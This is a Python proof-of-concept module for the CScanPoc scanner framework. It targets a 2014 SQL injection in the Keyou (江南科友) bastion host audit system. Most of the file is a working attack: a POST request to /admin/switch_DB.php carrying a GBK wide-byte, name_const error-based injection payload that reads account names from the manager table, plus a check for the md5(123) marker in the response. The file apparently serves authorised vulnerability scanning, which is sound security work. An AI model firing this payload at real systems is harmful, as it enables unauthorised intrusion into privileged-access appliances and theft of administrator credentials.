# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import time


class Vuln(ABVuln):
    vuln_id = 'Keyou_0004'  # 平台漏洞编号，留空
    name = '江南科友堡垒机 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-23'  # 漏洞公布时间
    desc = '''  
        江南科友运维安全审计系统（HAC）在 /admin/switch_DB.php 处存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '江南科友堡垒机'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7d60f90d-28fe-4fb5-85ca-e300bc7a4e4c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            arg = self.target
            path = "/admin/switch_DB.php"
            data = "button_login=%B5%C7+%C2%BC&account=aaa%bf'+and+exists(select*from+(select*from(select+name_const((select+concat(account,md5(123))+from+manager+limit+0,1),0))a+join+(select+name_const((select+concat(account,md5(123))+from+manager+limit+0,1),0))b)c)#&password=aaa"
            target = arg + path
            code, head, res, errcode, _ = hh.http(target, data)
            if code == 200 and '202cb962ac59075b964b07152d234b70' in res:
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
